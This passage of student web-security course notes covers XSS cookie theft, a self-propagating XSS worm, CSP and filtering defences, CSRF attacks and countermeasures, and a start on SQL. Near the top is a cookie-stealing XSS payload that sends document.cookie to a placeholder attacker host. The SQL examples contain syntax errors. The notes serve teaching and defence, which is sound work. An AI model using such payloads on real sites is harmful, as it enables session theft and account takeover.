&lt;/script&gt;</code></pre><h3 id="1041a926-7344-80cb-bed6-e711df0e5364" class="">Sending cookies</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1041a926-7344-8073-83ca-d42ef97b5687" class="code"><code class="language-HTML">&lt;script&gt;
		document.write(
			&#x27;&lt;img 
					src=http://attacker_ip:5555c=&#x27; + secape(document.cookie)
			&gt;&#x27;
		)
&lt;/script&gt;</code></pre></details></li></ul><ul id="1041a926-7344-8015-aab5-da99094f644c" class="toggle"><li><details><summary>Environment setup</summary><figure id="1041a926-7344-8089-bc65-efe5ffa1947f" class="image"><a href="image%20110.png"><img style="width:595.96875px" src="image%20110.png"/></a></figure></details></li></ul><figure id="1041a926-7344-8041-a191-ef3342594300" class="image"><a href="image%20111.png"><img style="width:624px" src="image%20111.png"/></a></figure><figure id="53636a38-9cd7-45d0-94a2-7cb6a2e865e4" class="image"><a href="image%20112.png"><img style="width:624px" src="image%20112.png"/></a></figure><figure id="1041a926-7344-8084-a234-f2663941efa3" class="image"><a href="image%20113.png"><img style="width:624px" src="image%20113.png"/></a></figure><figure id="1041a926-7344-80a6-80ba-e949fd5e16af" class="image"><a href="image%20114.png"><img style="width:624px" src="image%20114.png"/></a></figure><figure id="1041a926-7344-8080-9a08-d9a1eb90927b" class="image"><a href="image%20115.png"><img style="width:623.984375px" src="image%20115.png"/></a></figure></details></li></ul><ul id="1041a926-7344-806c-98aa-fd5e695e090c" class="toggle"><li><details><summary>Defacing</summary><figure id="1041a926-7344-80b8-b882-e7f83f5953bf" class="image"><a href="image%20116.png"><img style="width:624px" src="image%20116.png"/></a></figure><figure id="1041a926-7344-80b5-925f-fbac3ee42358" class="image"><a href="image%20117.png"><img style="width:624px" src="image%20117.png"/></a></figure><figure id="1041a926-7344-80bd-bec5-c712f8fccf46" class="image"><a href="image%20118.png"><img style="width:624px" src="image%20118.png"/></a></figure><figure id="1041a926-7344-80d0-8365-ef3cf5d7fe6a" class="image"><a href="image%20119.png"><img style="width:624px" src="image%20119.png"/></a></figure><figure id="1041a926-7344-80b3-8937-db677e330d95" class="image"><a href="image%20120.png"><img style="width:624px" src="image%20120.png"/></a></figure></details></li></ul><ul id="1071a926-7344-80f7-8f6e-f87d6a31a1f6" class="toggle"><li><details><summary>Self Propagating XSS Worm</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1071a926-7344-8027-9b02-d38e834ec1be"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><ul id="1071a926-7344-8079-b605-db7a0547d1f9" class="bulleted-list"><li style="list-style-type:disc">in the samy’s work example, the js reflectively attacked users who visited his page</li></ul><ul id="53bf4b4b-1046-443b-8638-ba9dae7982ec" class="bulleted-list"><li style="list-style-type:disc">the attack was propagated by infecting the victims to carry a copy of samy’s js code </li></ul><figure id="1071a926-7344-8060-b0b6-cde15c55bedc" class="image"><a href="image%20121.png"><img style="width:561.984375px" src="image%20121.png"/></a></figure><ul id="1071a926-7344-80e7-bc33-f6e7c630e388" class="bulleted-list"><li style="list-style-type:disc">js code can produce a copy of itself by using the DOM approach or Link approach</li></ul><figure id="01deec16-8e3d-4dc6-b723-479ae3f75992" class="image"><a href="image%20122.png"><img style="width:561.984375px" src="image%20122.png"/></a></figure></div></figure><ul id="1071a926-7344-80b5-9018-c64c8fdf0b5c" class="toggle"><li><details><summary>DOM Approach</summary><ul id="1071a926-7344-80bd-b96a-d7d59b4829a7" class="bulleted-list"><li style="list-style-type:disc">Domain Object Model (DOM) contains the contents of the page in a tree</li></ul><ul id="1071a926-7344-800a-bd68-d35dfce37778" class="bulleted-list"><li style="list-style-type:disc">can you DOM apis to access elements on the tree</li></ul><ul id="1071a926-7344-80fa-8a7d-ea785ddf7d40" class="bulleted-list"><li style="list-style-type:disc"><code>document.getElementByID()</code> is the most important API to get an element by id</li></ul><figure id="c62b97f9-1f7c-424b-b6d1-e74ad29b5285" class="image"><a href="image%20123.png"><img style="width:623.984375px" src="image%20123.png"/></a></figure><figure id="1071a926-7344-8017-a639-f2d34a67c39d" class="image"><a href="image%20124.png"><img style="width:623.96875px" src="image%20124.png"/></a></figure><ul id="1071a926-7344-8074-8898-f682b686d53e" class="bulleted-list"><li style="list-style-type:disc">innerHTML gives the contents of the element, (without the tag)</li></ul><ul id="1071a926-7344-80c3-99f0-d3b189d70a28" class="bulleted-list"><li style="list-style-type:disc">this can be used to get the code from a script tag by giving the script an ID and getting the innerHTML form it</li></ul><figure id="1071a926-7344-800d-8477-c07810c8b4e2" class="image"><a href="image%20125.png"><img style="width:623.96875px" src="image%20125.png"/></a></figure><figure id="1071a926-7344-80e5-97e5-fd879042021d" class="image"><a href="image%20126.png"><img style="width:623.984375px" src="image%20126.png"/></a></figure><figure id="1071a926-7344-804b-b8e8-fc7331368e84" class="image"><a href="image%20127.png"><img style="width:623.953125px" src="image%20127.png"/></a></figure><figure id="1071a926-7344-808a-a08d-e6d540d690ff" class="image"><a href="image%20128.png"><img style="width:595.953125px" src="image%20128.png"/></a></figure></details></li></ul><ul id="ddf4bd52-d5d7-4ca6-acd9-6a347bbf1962" class="toggle"><li><details><summary>Link Approach</summary><ul id="724746a8-55e1-4e3a-8b28-f99bd45063cd" class="bulleted-list"><li style="list-style-type:disc">write the attack code in a seperate js file (instead of copying the innerHTML of the script tag using the DOM)</li></ul><ul id="668e4bec-1e19-4187-9bf7-5922cf5def3a" class="bulleted-list"><li style="list-style-type:disc">the rest of the code to infect the user is the same, we just use the js file by linking it in the script tag </li></ul><figure id="1071a926-7344-800b-b383-e4ef71be0016" class="image"><a href="image%20129.png"><img style="width:595.984375px" src="image%20129.png"/></a></figure></details></li></ul><p id="1071a926-7344-8075-8b05-fe6c58862816" class="">
</p></details></li></ul><ul id="1071a926-7344-80b3-a0e6-e829efe9ad0f" class="toggle"><li><details><summary>Countermeasures</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1071a926-7344-80a1-9ae5-e26ae1bf689f"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="e3247245-64d9-4062-a135-a443ae38dc98" class="">fundamental cause of XSS is html allows JS code to be mixed with data</p><ul id="1071a926-7344-80fa-96da-dcc01762b79f" class="bulleted-list"><li style="list-style-type:disc">to prevent this, we can remove code from data or enforce access control</li></ul></div></figure><ul id="1071a926-7344-802f-a310-de3e459ba6c1" class="toggle"><li><details><summary>Filter Approach</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1071a926-7344-8049-9fcb-c5bf538b487b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="2ef40908-55a4-40ad-8a0a-0065be702261" class="">filters out code from the user input</p><ul id="1071a926-7344-8015-8d7f-ff23fd5d0f11" class="bulleted-list"><li style="list-style-type:disc">can remove all html tags (such as script tag)</li></ul><ul id="1071a926-7344-80ab-9794-c54b805623b3" class="bulleted-list"><li style="list-style-type:disc">remove attributes such as onClick</li></ul><ul id="b7f4f0bd-90d3-46a0-8a67-30b1a72bb3a3" class="bulleted-list"><li style="list-style-type:disc">strip the javascript word from anywhere so javascript can not be embedded in styles</li></ul></div></figure><figure id="1071a926-7344-8069-8849-dbef27111625" class="image"><a href="image%20130.png"><img style="width:595.96875px" src="image%20130.png"/></a></figure><figure id="e491bff0-c526-46eb-94aa-07245e44d205" class="image"><a href="image%20131.png"><img style="width:595.96875px" src="image%20131.png"/></a></figure></details></li></ul><ul id="1071a926-7344-80b9-916f-c942be158a1f" class="toggle"><li><details><summary>Encoding Approach</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1071a926-7344-8050-8f30-dd46ee40e52d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="97d638ea-3a20-43c5-84e3-43b99ffda218" class="">even if data includes JS code, just display the code as data and not execute it</p><ul id="1071a926-7344-80d2-a42c-da4c38d0be73" class="bulleted-list"><li style="list-style-type:disc">JS code encoded as a string</li></ul></div></figure><figure id="1071a926-7344-80bd-af63-f67c80a03340" class="image"><a href="image%20132.png"><img style="width:595.96875px" src="image%20132.png"/></a></figure></details></li></ul><ul id="bc92b0bf-b8f3-46d5-b64a-4ca0bd819c96" class="toggle"><li><details><summary>Elgg’s Approach</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1071a926-7344-80d6-bd67-f1b5ef94f13c"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="170faa86-af8d-4a7a-ba96-c28766dbe858" class="">PHP functions that handle sanitization (filter) and special characters (encoding) for you </p></div></figure><figure id="1071a926-7344-8085-99e6-ce1207e3d192" class="image"><a href="image%20133.png"><img style="width:595.984375px" src="image%20133.png"/></a></figure></details></li></ul><ul id="1071a926-7344-8020-bc2d-ff8055783215" class="toggle"><li><details><summary>Content Security Policy (Defeating XXS)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1071a926-7344-80b4-9299-f11b8192fd26"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="8d14e13e-7926-403f-9f60-91c1c4b66550" class="">CSP was designed to defeat XSS and clickjacking attacks</p><ul id="03e368e4-ba0a-46d4-a90d-4abf94ff4050" class="bulleted-list"><li style="list-style-type:disc">policy based on origin of the code<ul id="1071a926-7344-8091-b955-e619cdcd1a90" class="bulleted-list"><li style="list-style-type:circle">code from self will be allowed (eg: google.com)</li></ul></li></ul><ul id="1071a926-7344-8026-814b-cce7371791bb" class="bulleted-list"><li style="list-style-type:disc">inline code is secured by only running <ul id="1071a926-7344-8081-bc6d-c319be7f6506" class="bulleted-list"><li style="list-style-type:circle">set a nonce value and the script tags with the nonce value will be allowed to execute</li></ul><ul id="1071a926-7344-80dc-9602-ef9104c93024" class="bulleted-list"><li style="list-style-type:circle">hashing the code so only stored hashes can execute</li></ul></li></ul><figure id="1071a926-7344-804d-b280-ffdcebba165a" class="image"><a href="image%20134.png"><img style="width:533.984375px" src="image%20134.png"/></a></figure><ul id="34b68695-a959-4f53-950a-852055d50372" class="bulleted-list"><li style="list-style-type:disc">Attackers can also use the link approach to inject malicious JS code!</li></ul></div></figure><h3 id="211da9ae-ae11-4120-86d3-c35b70d14fff" class="">The Confused Deputy Problem</h3><figure id="1071a926-7344-8042-ac35-ef6ead644666" class="image"><a href="image%20135.png"><img style="width:384px" src="image%20135.png"/></a></figure><h3 id="1071a926-7344-800d-a7f3-e999857ca023" class="">Content Security Policy (CSP)</h3><figure id="1071a926-7344-8049-8c0b-eca7fb05f397" class="image"><a href="image%20136.png"><img style="width:595.984375px" src="image%20136.png"/></a></figure><figure id="1071a926-7344-800b-ae5b-d4a26cf17d4a" class="image"><a href="image%20137.png"><img style="width:595.984375px" src="image%20137.png"/></a></figure><figure id="1071a926-7344-803b-ae4b-fa931786711e" class="image"><a href="image%20138.png"><img style="width:595.984375px" src="image%20138.png"/></a></figure><figure id="1071a926-7344-8009-8a0b-f4692de2b437" class="image"><a href="image%20139.png"><img style="width:595.96875px" src="image%20139.png"/></a></figure></details></li></ul></details></li></ul><ul id="1071a926-7344-8088-8919-f4ac6627c298" class="toggle"><li><details><summary>JS code injection attacks</summary><figure id="1071a926-7344-802b-a3e6-d0b6f9a1e3f3" class="image"><a href="image%20140.png"><img style="width:623.984375px" src="image%20140.png"/></a></figure><figure id="1071a926-7344-80d1-acad-ee2f5de13481" class="image"><a href="image%20141.png"><img style="width:623.96875px" src="image%20141.png"/></a></figure><figure id="1071a926-7344-803f-8297-ec129276b78d" class="image"><a href="image%20142.png"><img style="width:623.96875px" src="image%20142.png"/></a></figure><figure id="1071a926-7344-8094-a728-cc99ba6b3b0c" class="image"><a href="image%20143.png"><img style="width:624px" src="image%20143.png"/></a></figure></details></li></ul><ul id="1071a926-7344-8087-9bca-d259f154b0a5" class="toggle"><li><details><summary>Tutorial</summary><ul id="ea5f37b5-09b6-4efc-a62a-cae20d3b4239" class="toggle"><li><details><summary>JS intro</summary><ul id="1071a926-7344-801e-896c-f9175e5a1557" class="bulleted-list"><li style="list-style-type:disc">== is loose comparison (it casts both values to the same data type)</li></ul><ul id="efb2a3f6-fc9e-415c-9fea-755ae5915764" class="bulleted-list"><li style="list-style-type:disc">=== is strict comparison (it doesn’t cast both values and respects the original types)</li></ul><h3 id="1071a926-7344-8002-b63a-f5f085754dd0" class="">built in functions</h3><figure id="c718fc78-1e06-4cc7-9668-5f65c86e107a" class="image"><a href="image%20144.png"><img style="width:2369px" src="image%20144.png"/></a></figure><h3 id="1071a926-7344-809b-aaad-f98582d918b9" class="">interacting with the dom</h3><figure id="1071a926-7344-80fe-8380-e075ce6efda8" class="image"><a href="image%20145.png"><img style="width:595.96875px" src="image%20145.png"/></a></figure><h3 id="1071a926-7344-805d-826d-e8f387a253b0" class="">ajax</h3><figure id="1071a926-7344-80f5-af13-da9e70ebadb3" class="image"><a href="image%20146.png"><img style="width:2472px" src="image%20146.png"/></a></figure><figure id="1071a926-7344-80f9-82ee-f208e07020f7" class="image"><a href="image%20147.png"><img style="width:2456px" src="image%20147.png"/></a></figure></details></li></ul><ul id="1071a926-7344-8008-a1ef-c9c261d2dde7" class="toggle"><li><details><summary>PHP intro</summary><ul id="7ccc6128-e0d7-40d7-b0d5-e716f03037f8" class="bulleted-list"><li style="list-style-type:disc">php also has loose and strict equality == and ===</li></ul><h3 id="1071a926-7344-802e-943e-cdc494f79ae1" class="">PHP forms and super global arrays</h3><figure id="1071a926-7344-80d1-acd9-ee18e988ea28" class="image"><a href="image%20148.png"><img style="width:2438px" src="image%20148.png"/></a></figure><h3 id="1071a926-7344-80f0-b2b9-fe17b761c11a" class="">php functions</h3><figure id="1071a926-7344-8058-940c-f5117e2d4a01" class="image"><a href="image%20149.png"><img style="width:2380px" src="image%20149.png"/></a></figure></details></li></ul><ul id="ff19ffc5-d7e9-474a-a8a1-782af93790c5" class="toggle"><li><details><summary>XSS attack example</summary><p id="94acde0c-8c8b-4420-b8db-3b8ee1b1bac2" class="">
</p></details></li></ul></details></li></ul></details></li></ul><ul id="10b1a926-7344-80fc-a4be-f47c2d281002" class="toggle"><li><details><summary>Cross Site Request Forgery Attack</summary><ul id="5cc52b25-4541-46ab-82ae-760da726cd3b" class="toggle"><li><details><summary>Cookies</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="f838d2c0-8b2f-4c3e-901d-972b7f435c37"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="9f00b598-3d86-4fca-b6da-d0d91a2f0c0e" class="">a name/value pair created by a website</p><ul id="10b1a926-7344-80b0-8a21-ee7f1a6e27b0" class="bulleted-list"><li style="list-style-type:disc">to store information on your compute</li></ul><ul id="10b1a926-7344-8097-8d3d-f0c4bf1f4e47" class="bulleted-list"><li style="list-style-type:disc">a work around for the stateless nature of HTTPS</li></ul><figure id="816d9810-dbdf-4bd2-95d3-d19ecc9269dd" class="image"><a href="image%20150.png"><img style="width:561.984375px" src="image%20150.png"/></a></figure></div></figure><figure id="10b1a926-7344-807d-8f0b-c50def32387d" class="image"><a href="image%20151.png"><img style="width:623.984375px" src="image%20151.png"/></a></figure><ul id="10b1a926-7344-80fd-a9f9-d5c91723dc74" class="bulleted-list"><li style="list-style-type:disc">cookie created by website A cannot be sent to website B</li></ul><figure id="10b1a926-7344-80e5-8834-f4744da3d65c" class="image"><a href="image%20152.png"><img style="width:623.984375px" src="image%20152.png"/></a></figure><ul id="848a68bf-ab64-4927-a1df-438c6ebfbd0c" class="bulleted-list"><li style="list-style-type:disc">“permanent” expires after a certain amount of time</li></ul><ul id="ea9a8148-39c2-4bd2-955b-00741148a4fc" class="bulleted-list"><li style="list-style-type:disc">session cookie expires either after the session ends or a certain amount of time</li></ul></details></li></ul><ul id="10b1a926-7344-8078-baa9-d6e96fb36f84" class="toggle"><li><details><summary>What is Cross Site Request &amp; Forgery</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="10b1a926-7344-8071-8d5b-dad9b61c40cf"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="10b1a926-7344-8034-9dd0-d543fc69cd64" class="">A <mark class="highlight-yellow_background">request from a website</mark> (A) <mark class="highlight-yellow_background">to a different website</mark> (B)</p><ul id="39a98e26-327d-4b5d-81c6-959cf2b97a88" class="bulleted-list"><li style="list-style-type:disc">same-site requestion: website A sending a request to itself (website A)</li></ul><ul id="10b1a926-7344-8012-b0d4-f7866717becd" class="bulleted-list"><li style="list-style-type:disc">not illegal to do: webpage that links to a Facebook post</li></ul><figure id="10b1a926-7344-8086-8afd-d81c9c2333b9" class="image"><a href="image%20153.png"><img style="width:511px" src="image%20153.png"/></a></figure></div></figure><h3 id="10b1a926-7344-80aa-ade1-d6eb98355288" class="">Cross-Site Request Forgery (CSRF)</h3><ul id="10b1a926-7344-8088-9bd4-ff80c3b8cf49" class="bulleted-list"><li style="list-style-type:disc">(same-site) request from website A to itself will <mark class="highlight-yellow_background">attach all the cookies belonging to that website</mark></li></ul><ul id="10b1a926-7344-8006-a130-fcbb0f0fa337" class="bulleted-list"><li style="list-style-type:disc">when a (cross site) request is sent from website A to website B, it will <mark class="highlight-yellow_background">attach all cookies belonging to website B</mark></li></ul><p id="10b1a926-7344-8068-bef1-ce14687ea6dc" class="">the cookies attached are by the client, the server cannot distinguish between same-site and cross-site requests</p><p id="fa4e47da-df37-4ad1-abea-f6425f8f4a3a" class="">a third-party website can forge requests that are the same as the same site request to give cookies from website A to B</p><ul id="10b1a926-7344-8004-a4c6-dab2ded74757" class="bulleted-list"><li style="list-style-type:disc">cross-site scripting is a confused deputy problem</li></ul><p id="1071a926-7344-80d6-918a-d8f3d3b35b4a" class="">
</p></details></li></ul><ul id="10b1a926-7344-80eb-91b0-f3e21c42cd21" class="toggle"><li><details><summary>CSRF attack with get</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="10b1a926-7344-8054-9a65-f0c6882542a2"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><figure id="da69adad-8db4-45a7-8f87-fd8e929af347" class="image"><a href="image%20154.png"><img style="width:561.96875px" src="image%20154.png"/></a></figure></div></figure><h3 id="10b1a926-7344-80a9-a2de-f0494f979f80" class="">HTTPS GET</h3><figure id="10b1a926-7344-80a1-894f-de66d9a16d56" class="image"><a href="image%20155.png"><img style="width:623.984375px" src="image%20155.png"/></a></figure><h3 id="10b1a926-7344-803d-98b4-e0a6ce456006" class="">Attack on GET</h3><figure id="10b1a926-7344-80c6-bc96-f9cd121a568d" class="image"><a href="image%20156.png"><img style="width:623.984375px" src="image%20156.png"/></a></figure><figure id="10b1a926-7344-8071-bd32-f8850def8721" class="image"><a href="image%20157.png"><img style="width:623.984375px" src="image%20157.png"/></a></figure><h3 id="10b1a926-7344-805a-828b-f08370389705" class="">Example</h3><figure id="5f551962-acee-4e3d-9f42-1c4c5cbb67c6" class="image"><a href="image%20158.png"><img style="width:623.96875px" src="image%20158.png"/></a></figure><figure id="10b1a926-7344-804e-b407-eed744834346" class="image"><a href="image%20159.png"><img style="width:623.96875px" src="image%20159.png"/></a></figure><figure id="10b1a926-7344-805e-8316-f6d90eb6669e" class="image"><a href="image%20160.png"><img style="width:623.96875px" src="image%20160.png"/></a></figure><figure id="10b1a926-7344-8083-8362-c005e1d1ac7d" class="image"><a href="image%20161.png"><img style="width:624px" src="image%20161.png"/></a></figure></details></li></ul><ul id="10e1a926-7344-8039-a58b-f4e2e16941ae" class="toggle"><li><details><summary>CSRF attack with post</summary><h1 id="10e1a926-7344-80f8-ba4a-e9f30f4d512c" class="">How to do it</h1><ul id="10e1a926-7344-80f0-a56f-c4355b25a3d7" class="bulleted-list"><li style="list-style-type:disc">making a form with javascript so the user makes a HTTP post request</li></ul><ul id="10e1a926-7344-802d-8c12-dbe674f9e16c" class="bulleted-list"><li style="list-style-type:disc">attacker wants the form to be submitted without the user having to click the button, this can be done with javascript</li></ul><figure id="10e1a926-7344-801f-84ec-f6b26b2434fa" class="image"><a href="image%20162.png"><img style="width:623.96875px" src="image%20162.png"/></a></figure><ul id="10e1a926-7344-8003-b468-ce8c776a456e" class="bulleted-list"><li style="list-style-type:disc">we can make a form using javascript instead of html</li></ul><ul id="10e1a926-7344-80db-bd35-fec31efc5bd8" class="bulleted-list"><li style="list-style-type:disc">form is submitted in the code</li></ul><ul id="10e1a926-7344-80b8-8228-ed319b018ce4" class="bulleted-list"><li style="list-style-type:disc">the forge post function is called on page load</li></ul><figure id="10e1a926-7344-808d-ba7c-f480f5f44f2a" class="image"><a href="image%20163.png"><img style="width:623.96875px" src="image%20163.png"/></a></figure><h1 id="10e1a926-7344-80aa-a73e-f50e46feed62" class="">Carrying out the attack</h1><p id="10e1a926-7344-8050-9e69-c51e5c2e2643" class="">Goal: Putting the statement “SAMY is MY HERO” in the<br/>victim’s profile without consent from the victim<br/></p><ul id="10e1a926-7344-807d-95a8-d396a0ac00ce" class="bulleted-list"><li style="list-style-type:disc">Samy captured an edit-profile request using<br/>LiveHTTPHeader extension.<br/></li></ul><figure id="10e1a926-7344-8057-a8df-fb469d46dc0a" class="image"><a href="image%20164.png"><img style="width:2483px" src="image%20164.png"/></a></figure><figure id="10e1a926-7344-8075-bba2-c54c98fc8384" class="image"><a href="image%20165.png"><img style="width:623.984375px" src="image%20165.png"/></a></figure></details></li></ul><ul id="10e1a926-7344-8007-9643-f23400c82e9e" class="toggle"><li><details><summary>Fundamental cause of CSRF</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="10e1a926-7344-80e3-b5cb-fd2bdfba9bd5"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="6ecbd458-dfc9-4639-9475-d034f9032a15" class="">many developers are not aware of the risk of cross site request</p><ul id="10e1a926-7344-8076-ac2a-dd066532e989" class="bulleted-list"><li style="list-style-type:disc">server doesn’t know if the request is cross or same site</li></ul><ul id="10e1a926-7344-8010-b3d3-f769ca42e63c" class="bulleted-list"><li style="list-style-type:disc"> cross and same site request should not be treated the same</li></ul><ul id="10e1a926-7344-8009-8563-f7b1d9af2cf9" class="bulleted-list"><li style="list-style-type:disc">browser is able to know the difference because it knows which page is requesting for another page</li></ul><ul id="10e1a926-7344-80f7-b69d-e898a0e4676e" class="bulleted-list"><li style="list-style-type:disc">browser can help counter CSRF by preventing CSR </li></ul></div></figure></details></li></ul><ul id="10e1a926-7344-803f-be52-e34cbda0b340" class="toggle"><li><details><summary>Countermeasures</summary><h3 id="10e1a926-7344-8060-8038-c09ca4646a4b" class="">Referrer header</h3><ul id="10e1a926-7344-80ff-9727-f71ca1ad4d33" class="bulleted-list"><li style="list-style-type:disc">host and referrer values are provided in the HTTP request error</li></ul><ul id="10e1a926-7344-80f9-8224-cb57d6e76b03" class="bulleted-list"><li style="list-style-type:disc">allows server to check for cross site and same site reuqests</li></ul><ul id="10e1a926-7344-80c8-aabc-d2a3cb5369ca" class="bulleted-list"><li style="list-style-type:disc">issue with the referrer field is that is reveals apart of the browsing history: privacy consern</li></ul><figure id="10e1a926-7344-80c2-96cd-fd479f0438cb" class="image"><a href="image%20166.png"><img style="width:623.96875px" src="image%20166.png"/></a></figure><h3 id="10e1a926-7344-8027-9258-d6d273be4a40" class="">Secret token</h3><ul id="10e1a926-7344-803b-bbee-cfaf2897130c" class="bulleted-list"><li style="list-style-type:disc">token can be embded in every webpage or to store it in a cookie: both are good</li></ul><ul id="10e1a926-7344-804e-a4a1-d5da74cdba47" class="bulleted-list"><li style="list-style-type:disc">secret value is included in the request</li></ul><ul id="10e1a926-7344-8082-a71d-cb4837a66f3d" class="bulleted-list"><li style="list-style-type:disc">its the web developer’s job to attach and check the secret value for each request<ul id="10e1a926-7344-8054-977a-cf1c3599d818" class="bulleted-list"><li style="list-style-type:circle">different pages don’t know this token</li></ul></li></ul><ul id="10e1a926-7344-8048-8d17-f2dfea0f2e85" class="bulleted-list"><li style="list-style-type:disc">this allows the server to know if the request is same or cross site without the privacy issue<h3 id="10e1a926-7344-80ba-b371-e55feb3b4a0a" class="">Elgg’s countermeasure</h3><ul id="10e1a926-7344-802f-8ed2-e5680104fb94" class="bulleted-list"><li style="list-style-type:circle">uses the secret token method to store the hidden fields</li></ul><figure id="10e1a926-7344-80bf-9bbf-ec7212493943" class="image"><a href="image%20167.png"><img style="width:623.96875px" src="image%20167.png"/></a></figure><figure id="10e1a926-7344-804e-8a72-c26beb26077e" class="image"><a href="image%20168.png"><img style="width:623.984375px" src="image%20168.png"/></a></figure></li></ul><h3 id="10e1a926-7344-80a5-9d07-d128dd10e2c4" class="">Same-Site cookies</h3><ul id="10e1a926-7344-8061-b3d3-f4299856d875" class="bulleted-list"><li style="list-style-type:disc">special cookie that provides an attribute to cookies called SameSite</li></ul><figure id="10e1a926-7344-80eb-97dd-d825eafaafc7" class="image"><a href="image%20169.png"><img style="width:623.984375px" src="image%20169.png"/></a></figure><figure id="10e1a926-7344-809e-a096-f4b4d89a320e" class="image"><a href="image%20170.png"><img style="width:2413px" src="image%20170.png"/></a></figure><figure id="10e1a926-7344-80e4-ab11-e530ac98846a" class="image"><a href="image%20171.png"><img style="width:2305px" src="image%20171.png"/></a></figure></details></li></ul></details></li></ul><ul id="1121a926-7344-8077-8dd3-dfaa4da21b48" class="toggle"><li><details><summary>SQL Injection Attack</summary><ul id="1121a926-7344-80a0-8929-c810b76ae767" class="toggle"><li><details><summary>SQL Crash Course </summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1121a926-7344-8016-b5b8-d66da2ea7aec"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="1121a926-7344-8080-a962-f66c2f3935e7" class="">MySQL is a popular open source SQL implementation for a relational database management system </p></div></figure><h3 id="1121a926-7344-80b9-930c-c9ef84be7395" class="">Log in</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1121a926-7344-805d-8a32-e5a11aa8fcf4" class="code"><code class="language-SQL">mysql -u root -pseedubuntu //can log into mysql database management system</code></pre><h3 id="1121a926-7344-80a8-a5ff-ef306c3b7c73" class="">Created Database</h3><p id="1121a926-7344-80f1-9718-dd4dbeda2fb4" class="">mysql can created multiple databases</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1121a926-7344-80a7-9590-c168b68521d0" class="code"><code class="language-SQL">SHOW DATABASES; //shows existing databases

CREATED DATABASE dbtest; //creates a new database</code></pre><h3 id="1121a926-7344-8084-8931-d5ec327dc621" class="">Create a table</h3><p id="1121a926-7344-80d3-a8b4-fd627aabb460" class="">relational database organizes its data using tables: rows being instances and columns being features</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1121a926-7344-8048-a136-fa856ba6fc92" class="code"><code class="language-SQL">USE dbtest //switches to a database
//creates a table with a name and schema
CREATED TABLE employee (
			ID INT (60) NOT NULL AUTO_INCREMENT 
			Name VARCHAR (30) NOT NULL //var char being a string
			EID VARCHAR (7) NOT NULL 
			Password VARCHAR (60)
			PRIMARY KEY (ID) //primary key being non duplicated
											 //can be used with other tables as a foreign key
);
